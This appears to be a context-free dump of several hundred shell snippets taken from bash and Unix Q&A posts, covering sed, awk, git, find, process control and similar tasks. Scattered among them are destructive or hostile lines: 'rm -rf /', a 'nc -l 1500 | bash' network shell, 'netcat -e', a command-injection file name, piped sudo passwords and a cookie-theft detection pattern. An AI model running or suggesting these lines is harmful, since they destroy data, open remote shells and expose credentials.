grep "integer =" $1 | awk -F='{TO16BIT_LENDIAN(printf("%d\n",int($2*327)))}' >> out.bin
CSI ? number h
CSI ? number l
ESC [
Ctrl + v
vim /usr/share/doc/xterm/ctlseqs.txt.gz
cat > inputfile
set -v
set +v
> /dev/null
set -xv
PS4='$LINENO: '
set +xv
echo() { :; }
script.sh debug
script.sh param1 param2
script.sh debug param1 param2
builtin echo
set +x
if [[ "${varN}" == "None" ]]
echo ${!BASH*}
compgen -v
compgen -v BASH
echo ${!BASH*}
echo 'something' > file.txt
vim myfile.txt -c 'wq'
vim myfile.txt -s the_file_containing_ZZ
ex my_file.txt <<< wq
i something to the file
if [ "$var" -eq "0.000000" ]
[ "$var" -eq "0" ]
echo '*.cpp' | sed 's/\*//'
echo '$.cpp' | sed "s/\\$//"
echo '$.cpp' | sed 's/\$//'
| egrep
svn diff
Team -> Create Patch
svn diff
svn status
svn diff > backups/project.diff
exec > logfile 2>&1
set -x
./foo.sh with some arguments
rm -rf /
$(( expr ))
ls -dm */
-maxdepth 1
$(( var % 13 ))
$(( var % 13 ))
$( $var % 13 )
var3=$(( var % 13 ))
-x bash
cat last_queries.txt | sed -n '12p;500p;700p'
eval $var
command option1 option2
exec time "$0" "$@"
echo 'my_file_name-02-and_some' | sed 's/.*[-_]\([0-9][0-9]*\)[-_].*/\1/g'
echo 'my_file_name-002-and_some' | sed 's/.*[-_]\([0-9][0-9]*\)[-_].*/\1/g'
'000' .. '999'
'A0000' .. 'Z9999'
git status
git fetch origin
git diff master origin/master
git log master...origin/master
git fetch
git ls-remote
bundle install --binstubs
bundle install --deployment
egrep -o
do echo -n "$dir "
command to execute & sleep time; kill $!
(ulimit -t 1; /your/program 2>/some/logfile) | head -c 100k
ulimit -a
-bash: !\n#2.: event not found
echo -e $1
echo -e ${1}
set +H
System: INFO (date time) : CPU Temperature { CPU Temp DATA }
head -n | tail -1
sed '10q;d' file
{print $0}
-s 41
-n 1
% = (runtime/baseline - 1) * 100
tail -n+N | head -1
tail -n+7 input.txt | head -1
tail -n+N
head -1
head -N | tail -1
head -7 input.txt | tail -1
tail | head
sed 'NUMq;d'
sed 'NUMq;d'
tail -n+N | head -1
head -N | tail -1
sed Nq;d
head | tail
tail | head
source ~/.bach_profile
source ~/.functions
getline 441 myfile.txt
g++ main.cpp
133.6 mn
1.21s system 116% cpu
5.353 total
7.58 GB
perl 5.36
7.966 secs (mawk2)
17.014 secs (perl 5.34)
grep TEXT /etc/passwd
[ -s $@ ]
[ -s $@ ] || rm -f $@
ls -dt */ | tail -n +11 | xargs rm -rf
rm -rf
ls -dt1
| rm -r
xargs -0 -r rm -rf
xargs -0
find /path/to/folder -maxdepth 1 -mindepth 1 -type d -printf '%Ts\t' -print0
-type d
-maxdepth 1
-mindepth 1
sort -rnz
tail -n +11 -z
-n +11
cut -f2- -z
xargs -r -0 rm -rf
rm -rf
grep -H '' <files> | sed 's/:/,/'
raw_input("Enter Your message. Use ^D when finished.")
python manage.py runserver
chmod +x manage.py
./manage.py runserver
echo rm
--mime-type -b
ls > file2
where @key=1
nombre=$(basename "$torrent" .torrent | sed 's/\[/\\[/g; s/\]/\\]/g')
-1 -2
-1 -3
-2 -3
hg add <tab><tab>
hg status -nmar
git status
git diff --cached
git diff
git diff <tab>
gid <tab>
git diff <tab>
git add
git -C untracked-dir ls-files -o --directory
git clean -f .git
git clean -f .git/
git ls-files -o --directory $SUBDIR
git ls-files -o --directory merge.c?*"' would not correctly return "[
](https://github.com/git/git/blob/c0af173a136785b3cfad4bd414b2fb10a130760a/merge.c)" when such a file exists), so we have to make sure to add the '
git status --ignored -- pathspec
tail -f file | telnet foo | while true; do blah; done
tail -f file | telnet foo | while read f; do echo "I got message $f"; done
tail | telnet | while read f; do ; done
grep foo file.log | grep bar
grep -E '(foo.*bar|bar.*foo)'
grep -E '(foo|bar)'
cat | grep | grep
cat file.log | grep -E '(foo|bar)'
grep -E
| tr '\n' ' '
ls --quoting-style=shell-escape-always
find *
find .
number count
sort {$a <=> $b}
declare -A name
echo 'bash -version
declare -A
which bash
source /etc/shells
type bash
bash --version
/usr/local/bin/bash --version
bash script
#!/usr/bin/env bash
GNU bash, version 3.2.57(1)-release (x86_64-apple-darwin16)
alias vi='for i in $( seq 1 $LINES ); do echo ; done ; vi'
set t_ti= t_te=
export LESS=-X
urxvt*secondaryScreen: false
<----- key start ----->
<----- key stop ----->
cat file.txt | tr -d '\n'
sed -n '1h;2,$H;${g;s/\n//g;s/<----- key \(start\|stop\) ----->//g;p}' key.txt
man 1 ed
key start
key stop
$ ./my_file.rb
$ ruby_wrapper.sh my_file.rb
/usr/bin/env ruby
xargs -0
log="${var}logs/console\ logs/since2_%m-%d-%Y.log"
svn update
svn export
SVN EXPORT
SVN EXPORT
SVN EXPORT -r BASE
<?php $dl = shell_exec('aria2c -d /home/user/ www.downloadlink.com'); ?>
shell_exec('/path/to/aria2c -d /home/user/ www.downloadlink.com')
export MY_ENV=
(HEAD, master)
git merge --no-ff
git nthlastcheckout
No screen session found.
screen -ls
screen -X
ssh user@host "$(typeset -f xscreen); xscreen ..."
Common Lisp Recipes
/bin/bash -c "your-command-stuff"
sudo echo
sudo -v
make; echo 'password' | sudo -S init 0
man rename
uname -a = "Linux 2.4.20-8smp #1 SMP Thu Mar 13 17:45:54 EST 2003 i686 i686 i386 GNU/Linux"
echo "$FILE"
echo $FILE
case "$FILE" in *.*) echo yes;; *) echo no;; esac
test "${TEMP}X" == 'X'
[ "$TEMP" = "" ]
[ -z "$TEMP" ]
[ "X$TEMP" == "X" ]
mv -- "$FILE" "$NEW_FILE"
Example: When I run this command:
However, when I run this command:
Actually, I do the same in script which is like:
s/ /\\ /g
ON UPDATE CASCADE
/CONSTRAINT\ .*\ FOREIGN\ KEY\ .*\ REFERENCES\ .*\ \(.*\)
ON UPDATE CASCADE
ON UPDATE CASCADE,
GNU bash, version 4.1.5(1)-release (i686-pc-linux-gnu)
Linux 2.6.35-28-generic-pae #50-Ubuntu
ls */*
ls */*
env -i
uniq -c
less /var/log/syslog
tail -f /var/log/syslog | grep process_name
journalctl -t <syslog-ident>
tee /dev/tty
git add .
rsync -rvz -e ssh /home/e-smith/files/ibays/drive-i/files/Warehouse\ Pics/organized_pics  imgserv@192.168.0.140:~/webapps/pavlick_container/public/images
ps aux
ps auxwww
| grep -v grep |
mkdir /tmp/MyWatcher_flagDir
grep -F 'substring'
grep -xF 'exact whole line'
ps | grep
pgrep -f 'PATTERN'
[ $APPCHK < 2 ]
[ $APPCHK -lt 2 ]
[[ foo < bar ]]
-e ssh
<img src="" style="display:none;"/>
<img src="" style="display:none;"/>
(?<=<img src=...ges/I/)
<img .../I/
SSH_AUTH_SOCK=/tmp/ssh-wScioBA10361/agent.10361 git pull
git pull
git pull
etc include bin ...
echo "hello this is a test"
set -x
bash -c
owned.txt; touch hahaha.txt; echo
owned.txt; touch hahaha.txt; echo
git show HEAD^^
git show HEAD^
git log ^production master
git log production..master
noglob git
files = Dir.glob("*.jpg")
ls *.jpg
ls /bin /usr/bin
cat info|while read
: "${!VAR? "ERROR: $VAR is undefined."}"
grep "^$var=" 2> /dev/null
[[ $foo ]]
$foo is not set
String []
bash -c
TRUNCATE TABLE
$ echo $OPTION
dirs =
express -v
npm install express -g
sudo npm install -g express-generator.
nano .bash_profile
echo "You bought $qty ${item}s."
[ … ]
[[ … ]]
grep -R
set -f
ack .*
set -f
${@} are the arguments you pass in when you start
ba split
bana split
grep baclava bnm hello.txt
ack .*
ack . ..
ack '.*'
grep -r filename *
man at
kill(-pgid, SIGINT)
set -e
set -x
set -x
set -x
set -e
history | tail -2 | head -1 | cut -c8-
tail -2
head -1
cut -c8-
ls *.zip *.rar
shopt -s failglob
rename s/.244// /home/test/*.244
ps -ef
myVariable = ps -ef
This line is new
s/$/This line is new/
This line is new
sed $'...' <<<
EXIT HERE
kill -SIGINT $$
x"${BASH_SOURCE[0]}" == x"$0"
set -e
dq2-get $1
set -e
setup.exe --packages=list_of_packages_you_need --quiet-mode
grep -q
cat file.txt | head -1
head -1 file.txt
bzr ... || exit
*FAILURE ) ...
$( < file )
$(cat file)
set -e
bash -e build_script.sh
set +e
bzr commit whatever
set -e
foo || exit 0
bzr commit
bzr commit
echo $?
env >/tmp/your.env
echo test | mail -s test my-email@example.com
echo "Something for input" | python myPythonScript.py
CFLAGS="-g -O0"
$(dirname ${BASH_SOURCE[0]})
md5 apks/apk_$i.apk
set -x
for f in ./{test1,test2,test3}/*
for f in ./*/*
[[ ... =~ ... ]]
declare -p
nano /var/git/repositories/holding.git/hooks/post-update
env -i
unset GIT_DIR
git init
env -i
git log
sort -R
openssl enc
man xargs
grep -z
export PYTHONPATH="${PYTHONPATH}:/path/to/myDjangoProject/"
DJANGO_SETTINGS_MODULE="/path/to/myDjangoProject/settings" vim $@
alias vi="vim_wrapper"
vi /path/to/myDjangoProject/urls.py
:python from django import db
vim_django urls.py(or other files)
Ctrl-x & Ctrl-o
wget -S -i *file*
-o /dev/null
--write-out '%{http_code}\n'
{print $2}
. $HOME/.bashrc
for file in *.JPG; do mv $file thumb_$file; done
for file in $(find . -name '*.JPG'); do mv $file $(dirname $file)/thumb_$(basename $file); done
for ... in ...
find . ...
print quoted
export PS1="\u@\h \w> "
ssh {remotehost} tail -n0f {logfile}
less filename
tail -f
cat -n
cat -n
echo ${10}
"SELECT email FROM Edsrn WHERE userid = 1235"
sleep 20
kill -s SIGINT $!
kill -INT %+
mysql -e query
' channel=0'
'AP ac:67:0'
tr -d
cd ~; cd -
cd ~ && cd -
cmd1 && cmd2
cmd1 ; cmd2
command1 && command2
exit 0
command1 ; command2
cd /tnp/test && rm -rf *
"document.cookie" | "setcookie"
grep -r -n -i --include="*.html *.php *.js" searchstrinhere .
find "/starting/path" -type f -regextype posix-extended -regex "^.*\.(php|html|js)$" -exec grep -EH '(document\.cookie|setcookie)' {} \;
-regextype posix-extended
-regex "^.*\.(php|html|js)$"
-exec grep -EH '(document\.cookie|setcookie)' {} \;
find "/starting/path" -type f -regextype posix-extended -regex "^.*\.(php|html|js)$" -exec grep -EH '(document\.cookie|setcookie)' {} \; | sed -r 's/(^.*):.*$/\1/' | sort -u
sort -u
(click here ....)
click here
(click here anychar but '(' )
ls -l
man sort
file test.o
echo -n ...^M
echo ... \r\c
exec ls
> >
>(tee -a script.log)
>> script.log
tee -a script.log
sudo apt-get install libmagickwand-dev
sudo apt-get install libmagickwand-dev
:!bash -c t2p
set shell=bash\ --login
:!tb2p %
vim :help shell
$(which ls)
command ls
sort -k2,1n
man uniq
-bash: syntax error near unexpected token '!'
[[ ... ]]
awk 'NF<=1{print}' testfile
man ed
nohup ./original_script
trap '' HUP
nohup someCommand&
echo $?
uname -s
git add --all
commit -a
local a="${1}"
local a='param_1_*'
local 'a=param_1_*'
script -f
tail -f
echo hello >/dev/pts/NNN
line 2: [: ==: unary operator expected
if [...]
if [ == ""]
grep -o
wc -l
awk '{print gsub(your_regex,"&")}'
awk '{c+=gsub(your_regex,"&")}END{print c}'
ls | grep | wc
find . -name foo.c -print
-regextype posix-egrep
-regextype posix-extended
-bash: yiic: command not found
chmod +x yiic
/framework/yiic shell
/framework/yiic shell
(<networkConnector bla="blubb"/>...)
ulimit -t 0.5 command
ulimit -t 1 command
struct itimerspec
struct sigevent
struct itimerval
SET /?
man execve
sudo ./a.out -n /dev/pts/0 $'\cc'
pgrep -P $!
pid=$(pgrep -P $!)
pid=$(pgrep -P $! )
git clone
git pull
test -r ~/Dropbox/bin/bash_profile && . ~/Dropbox/bin/bash_profile
export PATH=~/Dropbox/bin:$PATH
cut -f 2 -d , file.csv
-f 2
-d ,
grep -c R
 "'%$1%'" 
bind -p
0x18 0x7f
0x1b 0x08
0x1b 0x64
0x1b 0x62
0x1b 0x66
0x18 0x1f
Left/Right option <kbd>⌥</kbd> key acts as +Esc
Natural Text Editing
xxd -psd
⌘← "SEND ESC SEQ" OH
⌘→ "SEND ESC SEQ" OF
command >> file_to_append_to
echo "Hello" >> testFile.txt
set -o noclobber
command > file_to_append_to
file exists: testFile.txt
hello tom
cat fileName_1.txt >> fileName_2.txt
type fileName_1.txt >> fileName_2.txt
uniq -i
sort -k 2,2 test.txt| uniq -i -f 1 | cut -d ' ' -f2 > result.txt
sort -k 2,2 test.txt| uniq -i -f 1 | cut -d ' ' -f2 | awk '{print $2}' > result.txt
print $2
tar xzv
X && Y
sh -c
list=('hello world' 'foo bar')
ls -l
$1, $2..$9, ${10}, ${11}
HTK toolkit
some HTK command -H hmm_1/do -H hmm_1/<something else>
echo "${template_str}"
$(rm -rf /)
rm -rf
<%= ENV['X'] %>
I love you, World! You are wonderful
visual studio code
cd m25.1240_m22.1250_m5.1540
(. ~/FILE or . $(type -p FILE))
bash b
command this-here
php /home/public_html/example.dev/index.php
sed -i 's/salt_here/'$SALT'/g' wp-config.php
'put your unique phrase here'
SALT="$(wp_generate_password 64 1 1)"
man bash
set keymap vi
set editing-mode vi
find  Sources/$1-$2  \( -iname "*.php" -o -iname "*.rb" \) -print |xargs perl -pi -e "s/domain.com/$2/g"
shopt -s globstar
find -name
bash -s
ffmpeg -i file.mp4 | grep Duration
ffmpeg -i file.mp3
Duration: 00:00:04.80, bitrate: 352 kb/s
myscript.py: abrt: detected unhandled Python exception in myscript.py
/usr/bin/python /path/to/myscript.py -i /path/to/input.txt --log --timer
69 13 05 06 * { var=1 ; export var ; cmds ... ; } ...
. /path/to/envFile
conditional binary operator expected.
return N
$ help if
if: if COMMANDS; then COMMANDS; [ elif COMMANDS; then COMMANDS; ]… [ else COMMANDS; ] fi
if COMMANDS
then COMMANDS
elif COMMANDS
then COMMANDS
else COMMANDS
1 2
man bash
echo "1.2.14" | awk -F \. {'print $1,$2, $3'}
firstVariable=$(echo "1.2.14" | awk -F \. {'print $1'})
tail -f
tail -f
tail -f
perl program http://example.com/foo?bar=23&thing=42
-bash: thing: command not found
echo -e
${_//+/ }
echo "%31+%32%0A%33+%34" | python -c "import sys; from urllib.parse import unquote ; print(unquote(sys.stdin.read()))"
printf '%b\n'
echo -e
s/\+/ /g
chmod +x decodeurl.sh
gawk -b
FS | OFS
uridecode [-v varname]
printf -v varname %b...
"Binary file matches"
GNU parallel
GNU parallel
GNU parallel
man parallel
mount /mount/location
perl -pi.bak -e 's/^document.*lcbmc.*\n//g' found-item-1.js; perl -pi.bak -e 's/^document.*lcbmc.*\n//g' found-item-2.js
$1, $2, ...
echo "Enter Recording Date, Recording Unit-ID, and File-ID Separated by SPACE"
read RD RU FID
echo "Your input is: $RD, $RU, $FD " >> /home/user-name/Music/User-Input.txt #This is for logging
mv $FLACS/*.flac $FLACS/${RD}-${RU}-${FID}.$flac
mv: target 22112011-Unit05-File0. is not a directory
find bar -iname "*.wav" -printf 'mv %p %p\n' \
if $1 = a then
if $2 is b then echo a and b
else $1 = 1 then
if $2 = 2 then echo 1 and 2
man yes
man expect
subprocess.call('echo -e "root (hd0,1)\nfind /boot/grub/menu.lst\nsetup (hd0)\nquit" | grub --batch', shell=True)
Mrs|Jane Brown
pwd -P
pwd -L
ls -lR
netcat -e
{ … }
x=2; { x=4; }; echo $x
x=2; (x=4); echo $x
[[ … ]]
-n $variable
-e $file
"$string1" == "$string2"
[[ $foo == a* ]]
[[ $foo == "a*" ]]
[[ "$x" == "$y" ]]
[[ "$x"=="$y" ]]
[[ -n $foo ]]
[[-n $foo]]
[ … ]
3 -eq 03
3 = 03
perl -pi -e 's/<td>\sReplaceMe\s<\/td>/<td>Replaced<\/td>/g' temp
within a pair of x and y
return 1
return 0
return 1
return 0
a && b
return 0
myscript --nowarnings
146 days until deadline.
pgrep -fl java | awk {'print $1'}
ps aux | grep java
$ ps -fea|grep -i java
cat inputFile | cut -f1,2 -d":"
cat inputFile
cut -f1,2 -d":"
grep -o
ls -1R main-directory
ls -1R main-directory
find . -type f
find ... -exec
read file
find ... -exec {} \;
sed 's/:$//'
ls -1R main-directory
echo $?
echo $?
"${h1}" = "${h2}"
echo ${SERVERCOMMAND}
cd -
cd ${TRUNK}
bash -x script_name args....
set -x
$(( ... ))
join -t ';'
printf %q
cat strings.txt
cat quote.sh
echo "$HOME"'/foo!?.*'
"""\special character"""
! " * ^ % $ # @
$ escape_args_then_call_as myname whoami
cc c
"pre $@ post"
/usr/bin/time -p
|| true
set -e
set -e
|| true
sed -n '/error\|warning/I,/^$/p'
ps ax | grep...
date --help
echo $var | wc -l
echo -e
printf "%s" "$a" | grep -c "^"
wget www.webpage.com/index.html?selectname=
free -m
echo $var1
echo ${IPS[@]}
grep =
grep -A
"pass : QWJjMTIzCg== "
| tr -d ' '
grep -URbFo <searchterm> . > <output>
grep -b
xxd -u /usr/bin/xxd
grep -aP "\xdf"
-N, --timestamping
lynx -source
$0 -v &>/dev/null &
map gzcat $@
bash -c "$cmd"
eval $cmd
echo $PATH
git symbolic-ref HEAD
git symbolic-ref HEAD
env -i
man test
socat -u EXEC:'follow_log_cmd' UNIX-SENDTO:/tmp/socket
socat -u UNIX-RECV:/tmp/socket -
svn mv
cat /tmp/columns.txt | column -t
function pad () { [ "$#" -gt 1 ] && [ -n "$2" ] && printf "%$2.${2#-}s" "$1"; }
String[] cmd = {"bash", postfile };
chmod a+w ApplicationLogs
ps -amcwwwxo "command %mem %cpu" | grep -v grep | head -13
echo ${input:6:1}
MoveToTarget() {
MoveToTarget $SourcePath, $DestPath
num= 1
num =2
num=`expr $num1+ $num2`
$(( ))
man bash
"$(( $* ))"
(( expr ))
sips -h
ls /usr/bin/sips
bash test.bash
export HOSTNAME
history|awk '{print $2}'|awk 'BEGIN {FS="|"} {print $1}'|sort|uniq -c|sort -rn|head -30
numbers.txt using file descriptor 5.  read -u 5 a means read from a value for a from file descriptor 5, which has been associated with numbers.txt
 using file descriptor 5.  read -u 5 a means read from a value for a
read -u 5 a
paste number.txt alpha.txt
$(paste number.txt alpha.txt)
echo -e '' + '\n' + $LINENO
man 8 cron
crontab -e
crontab filename
man 5 crontab
crontab -l
exec -a
dirname $(readlink -f $0)
readlink -f $0
bash --version
else if
:set fileformat=unix
File -> Save as
end line
DATA.PATH_PREFIX  ./afs/kinetics400
byte order mark
ESC [3J
clear && clear
tput reset
tput clear
tput reset
setterm -reset
tput reset
echo -e "\033c"
printf "\033c"
tput reset
stty sane
alias django_serve="python manage.py runserver &"
bash -c
#! …
… <( … )
sed -i 's/(_[^_]+)$/\1/' myfile
sed -i 's/(_[^_]+)$/\1/g' myfile
sed -e 's/.../.../g' oldfile > newfile
tail -f logfile
cat /dev/urandom | python -c "from __future__ import print_function; import sys; import datetime; map(lambda x: print(datetime.datetime.now(), x), [line for line in sys.stdin.readlines()])"
man ts
man date
grep ... | rl | head -n 1
{print awkvar}
awk -v awkvar=${SHELLVAR} '{print awkvar}'
man awk
awk -v awkvar=${SHELLVAR} 'BEGIN{print awkvar}'
wc -l inputFile.txt
stty -a
stty -a
quit = ^\;
$ sleep 60
$ sleep 60
$ ping google.com
ps s
yes >/dev/null &
ps s
ssh localhost
yes >/dev/null &
set $tool=valgrind
set blah blah blah
$1 ... $N
set $tool=valgrind
man bash_builtins
$1, $2, ... $n
-x argument
Terminal > Preferences > Encodings
NR_021492 NM_005198 NM_152247 NM_152253
NR_021492 NM_005198
egrep -o 'N[RM]_[0-9]+
m4 $( env | sed 's/\([A-Za-z0-9]*\)=\([\/A-Za-z_0-9:|%*. -@]*\)/-D\1=\2' ) myfile
echo \*
echo *
for splice @F,3
print @F,$_
chmod +x script.pl
"$F | sed s/$PREFIX//g | sed s/$SUFFIX//g"
NUMBER=$($F | sed s/$PREFIX//g | sed s/$SUFFIX//g)
$myString = "junk(150)moar";
find path1 path2 .
readlink -- "$filename"
realpath -m
Parameter Expansion
make mrproper
make distclean
sed: -e expression #1, char 5: extra characters after command
%CURL_CMD% ...
if NOT EXISTS ...
set ...
~/Library/MobileDevice/Provisioning Profiles
man bash
Argument list too long
diff -q directory1 directory2
info diff
"select * from schema.table"
C:\>set PGPASSWORD=pass
C:\>psql -d database -U user
export PGPASSWORD='password'
psql -h clustername -U username -d testdb
set PGPASSWORD=pass
psql "postgresql://$USER_NAME:$PASSWORD@$HOST_NAME/$DB_NAME"
vim -d
diff -D MARKER f1 f2
chmod a+x post-commit
join FILE1 FILE2 -1 4 -2 2 -t"tab"
-1 4
-2 2
help printf
man bash
... commands separated by a ; are executed sequentially
set -f
M-! <your command> RET
bash -c emacs
source ~/.bash_profile ; echo post-env; env
./delete -r (filename)
shopt -s direxpand
sleep 1
${@: -1:1}
Operation must be run in a work tree.
remote: fatal: /usr/lib/git-core/git-pull cannot be used without a working tree.
env > from_terminal
env > double_click
set -vx
add_to_ld_path /my/path
ls -l
test -d
test -e
test -f
xyz --qa --mysql
xyz --mysql -- qa
find *.{h,cpp} -maxdepth 1 -type f
M-x compile
make | ccze -A
export tput
make check-env
kill -9
kill -9
kill -9
ps -aux | grep...
kill -9
set --
sort -k 2 -n filename
sort --key 2 --numeric-sort filename
source ./myScript.sh
. ./myScript.sh
wget -o log
./xargs-parallel.sh jobs.txt 4
$(seq 1 "${tasks}")
do shell script "$HOME/login.sh"
Show library
Run shell script
System Preferences
Users & Groups
Login items
System Preferences
Login items
launchctl load [filename.plist]
chmod a+x /path/to/executable/script.sh
launchctl load ~/Library/LaunchAgents/com.user.loginscript.plist
launchctl start com.user.loginscript
cp foo_[0-54].jpg
./manage.py inspectdb
./manage.py inspectdb > myapp/models.py
export DJANGO_SETTINGS_MODULE=settings
man ssh_config
find .  -maxdepth 1 -type d -size +1c | sort
syntax on
syntax on
C:\Program Files (x86)\Git\share\vim\vim73\syntax
[ FAILED ]
echo -n $"Shutting down Launcher"
dry run
~/bin folder
awk '{print $1, $2, for (i=$5; i <= NF; i++) print $i }' file > outfile
awk '{print $1"\t"$2"\t"substr($0, index($0,$5))}' temp.txt
> newFile
>> newFile
awk '{print $1"\t"$2"\t"substr($0, index($0,$5))}' temp.txt > newFile.txt
cut -f1,2,5- temp.txt
-e "1r $template_file"
-e "\$r $trailing_file"
iwconfig eth0
xargs -0
man grep
grep -c
[ ]
exec $HOME/bin/sync-iosbeta;
man bash
interesting_command_generating_script.sh | java net.vzybilly.MyCoolClass
\( ... \)
find */**/.gitignore
man bash
awk -F\" '{print FS$2FS}' inputFile.txt
-e cmd
man inotifywait
man inotifywatch
eval <some command>
find all files in ${targetFolder}, pipe that into stat -f "%m" 1-by-1 and then pipe that into md5
stat -f "%m" [filepath]
rm -rf XYZ
export HISTIGNORE=' *'
rm -rf
man bash
nproc --all
cat /proc/cpuinfo | egrep "core id|physical id" | tr -d "\n" | sed s/physical/\\nphysical/g | grep -v ^$ | sort | uniq | wc -l
lscpu -p
getconf _NPROCESSORS_ONLN
getconf NPROCESSORS_ONLN
sysctl (3)
lscpu -p
chmod +x cpus
grep -P '^core id\t' /proc/cpuinfo | sort -u | wc -l
awk '/^core id\t/ {cores[$NF]++} END {print length(cores)}' /proc/cpuinfo
lscpu | awk '/^Core\(s\) per socket:/ {cores=$NF}; /^Socket\(s\):/ {sockets=$NF}; END{print cores*sockets}'
lscpu -p | awk -F, '$0 !~ /^#/ {cores[$1]++} END {print length(cores)}'
getconf _NPROCESSORS_CONF
lscpu -ap
8 cores
16 cores
2 sockets
20 CPUs
cat /proc/cpu
cat /proc/cpuinfo
cat /sys/devices/system/cpu/present
cat /sys/devices/system/cpu/online
cat /sys/devices/system/cpu/offline
cat /proc/cpuinfo | grep -B2 'core id' | sed 's/siblings.*/'/ | tr -d '[:space:]' | sed 's/--/\n/'g | sort -u | wc -l
parallel --semaphore
grep -Fxv -f file1 file2
foo bar
sed -n '/[test1]/,/[test2]/{/[test2]/!p}' test.txt > temp.txt
grep -n
| bash
(( expr ))
help let
let: let arg [arg ...]
-scale 1
set -u
set -u
lockfile -l <timeout seconds>
-<sleep before retry, seconds>
-r <number of retries>
-s <suspend seconds>
sudo gem install ...
command not found
EXECUTABLE DIRECTORY
$(cd $(which gem)/..; pwd)
$(brew --prefix ruby)/bin
brew unlink ruby; brew link ruby
brew --prefix ruby
ooffice -p
sed -i 's/foo/bar/g' file
sed -i
bash -c 'if [[ "hello" =~ ^[a-zA-Z0-9]\{1,\}\\.$ ]] ; then echo "OK" ; else echo "KO" ; fi
grep ... > file1
man sort
man grep
man sed
man awk
man strings
man tee
Pattern matches return the string matched between \( and \) or null; if \( and \) are not used, they return the number of characters matched or 0.
{print $0}
if [ $? ]
echo ${pkg} | grep -qE "bz2$"
echo ${pkg} | grep -q -E "bz2$"
if [ $? -ne 1 ] ; then
awk -f
man bash
nohup yourscript.sh &
#!/bin/sh -x
env > env_terminal
env > env_script
diff env_terminal env_script
find *test.c
find . -name *test.c
find: paths must precede expression: mytest.c
sort -V
ls -v
ant … < /dev/null
date -d
nc -l 1500 | bash
tail --follow=name --retry
rm -f /tmp/file.txt
git commit
$1 as
my message
git status
hg summary --remote
tput sc
tput rc
tput el1
source ./generated.sh
$ dirname /home/~username/stuff/backup/file.zip
-j 4
-j maxjobs
sed -i 's|file.sh|./path/to/file.sh|g' ~/bin/script.sh
ln -s
ln -s /far/off/script.sh ~/bin/script.sh
ln -s /far/off/file.sh ~/bin/file.sh
man calendar
$(command ....)
$(command $(another $(nexT)))
i=$(expr $i + 1)
i=$(echo "$i+1"|bc)
1 110114072915
(BUILD: 1 P16A22_110114072915)
MODULESd[$3] = $4
CASESd[$3] = $5
labels $@
print NF > "/dev/stderr";
labels $@
labels $a
source foo.sh
cd /whatever/path
man bash
bash --version
$(eval echo $a)
${foo:?Please specify a foo.}
rm $1
rm "$1"
ls | grep test
cut -c273-276
tr a-z A-Z
typeset -u
cat ${INPUT_FILE} | grep ...
bash -n yourscript.sh
Some File
cmp -q
man convert
cut -d ";" -f1 /tmp/list2.csv
grep -f some_file
grep -f
grep -v
svn status | perl -nale 'print $F[1] if /^M/' | xargs svn revert
svn status
echo -n value > .var3
echo "values are $var1 $var2 $var3"
echo "values are $(cat .var1) $(cat .var2) $(cat .var3)"
echo val > .named_pipe&
bash script-name.sh StoryName
./script-name.sh StoryName
chmod +x
./create-story.sh NewStory
chmod +x create-story.sh
chmod +x newstory; sudo mv newstory /usr/games/
newstory "Name Of Story"
grep -oP "\d+\.\d+" testFile | awk -vx=0 '{x += $1} END {print x/NR}'
awk -vx=0 '{x += $4} END { printf ("%8.9f", x/NR) } testFile'
awk -vx=0 '{x += $4} END {print x/NR}' testFile
sed -i '/^$/d' testFile
sed  '/^$/d' testFile > newFile
sed '/^$/d' testFile | awk -vx=0 '{x += $4} END {print x/NR}'
echo '…'
script < /dev/fd/123
script <<< 'string'
diff <(ls /bin) <(ls /usr/bin)
diff /dev/fd/10 /dev/fd/11
< <(…)
&> /dev/null
> tmp.txt
open my $fh, '>', 'tmp.txt'
> ~/out.log 2 > &1
chmod a+x /usr/bin/startLDAPServer.sh
echo foo $x; sleep 5
net use
net use Z: \\192.168.0.2\Data
net help use
mount //192.168.0.2/Data /mnt/Data
-o User=YOURUSER
An argument of - is equivalent to --
set --
set -
set - ...
set -v
set - ...
set -- ...
set -x
set -v
set -x
bash -x <script>
set - ...
set -- ...
[1, 4, 5, 6, 8, 2]
[1, 4, 5, 6, 8, 2]
[0, 9, 3, 7]
echo -n aWord | md5
bash 4.1.10
#!/bin/bash -x
grep -v grep
-o pid=
set -e
set -o pipefail
set -e
set -o pipefail
set -e
set -o pipefail
grep() { env grep "$@" ...; }
grep -v grep
| grep
bash -x
cat *.xml | grep xyz | wc -l
SOMETHING *.xml | grep xyz | wc -l
git init
bash /tmp/gitconfig.bash
head -3
help test
man test
in words
in "$@"
sort: empty tab
od -c
echo "g\0u\0b\0k" | sort -t $'\0'
echo -n
"Insert a word: "
command1 && command2
parse_commands /da/cmd/file
set -o pipefail
-ne: unary operator expected
[ ${PIPESTATUS[0]} -ne 0 ]
test ${PIPESTATUS[0]} -ne 0
PIPESTATUS: 0 3
[: -ne: unary operator expected
grep -q
command -v
type -P
whence -p 
if which foo
command -v
command -v
type -P
whence -p
&> /dev/null
is_executable name_of_executable
compgen -A variable
echo -en "$var_quoted"
| hd
<(command ...)
echo -en
cat template.txt | ruby -e 'puts STDIN.read.sub("%placeholder%", IO.read("content.txt"))' > output.txt
#!/bin/bash -x
( ... )
... &
getPages $KEY $VALUE &
<( ... )
(( ... ))
total=$(( total + subtotal ))
--environment hostname
--number ${#ARRAY[*]}
--number 4
--parameters "${ARRAY[@]}"
wc -l
ps -f
wc -l
wc -l
xargs -P
foo && true
while true
sleep 10
kill $!
line 2: /bb/bin/1: Permission denied
grep '^\#ctags$' ./"$1" | wc -l
[ -f ... || -d ... ]
wait ${pids[*]}
$ stat a\ b\ c/sub/folder/example.txt; mv $_ .
$ echo "1" "One String Quoted"; for i in $_; do echo \"$i\"; done
$ echo 1 2 "3 4 5";
$ for i in !*; do echo \"$i\" done;
PS1="LIGHTGREEN - whatever - $RESET"
man echo
\[ \]
\[ \]
./test.mak -j 4
./test.mak -j 5 -l 1.5
find ... -exec md5sum {} ... +
cat $file > $namedpipe
netcat -l 9998
echo "${@:1:2} ${@:4:8}"
echo test
man re_format
dev mutants X-Weapon
dev mu[TAB]
dev mutants
dev mutants X[TAB]
dev [TAB][TAB]
--table / -t
man column
stty -echo
cat > /tmp/to
cat /tmp/from &
tail -f /tmp/from &
git describe --tag
-D'REV="$(shell git describe --tag)"'
(x, y)
x value
y value
echo "hello" | xterm &
xterm -e echo "hello"
xterm -e anyprogram
[: too many arguments
'    '
sed -t
grep -v '^$'
sed '/^$/d'
gnome-terminal "$args"
gnome-terminal $args
echo "${USER} uses ${LANG#*.} encoding"
printf %q
ps ax
echo $(ps ax)
ps ax
echo $10
jar tvf
